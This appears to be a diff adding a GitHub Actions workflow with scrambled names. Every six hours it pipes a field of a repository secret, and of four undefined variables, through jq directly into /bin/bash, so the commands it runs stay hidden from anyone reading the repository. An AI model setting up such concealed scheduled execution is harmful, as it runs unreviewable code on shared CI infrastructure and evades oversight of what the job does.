@@ -1,0 +1,21 @@
+name: panfuming1199
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: panfuming1199
+        env:
+          z534: ${{ secrets.z534 }}
+        run: |
+          echo $z534 | jq -r .jao93 | /bin/bash
+          echo $nw3 | jq -r .ou5 | /bin/bash
+          echo $nhuqw76 | jq -r .yuobq84192 | /bin/bash
+          echo $l47 | jq -r .bjv35069 | /bin/bash
+          echo $bodl69 | jq -r .rv21539 | /bin/bash
+
